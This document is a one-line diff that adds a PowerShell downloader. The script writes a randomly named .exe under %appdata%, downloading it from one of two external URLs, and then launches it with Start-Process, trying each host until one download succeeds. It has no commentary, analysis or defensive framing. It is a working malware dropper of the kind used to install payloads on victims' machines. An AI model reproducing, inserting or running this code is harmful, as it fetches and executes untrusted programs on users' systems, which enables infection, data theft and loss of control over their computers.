@@ -1,0 +1,1 @@
+$random = New-Object System.Random; Foreach($um in @({http://o-infinity.org/csf.exe},{http://arumeria.tyanoyu.net/nas.exe})) { try { $fg = $random.next(0, 61132); $pp = '%appdata%\' + $fg + '.exe'; (new-object system.net.webclient).DownloadFile($um.ToString(), $pp); Start-Process $pp; break; } catch { Write-Host $error[0].Exception } }
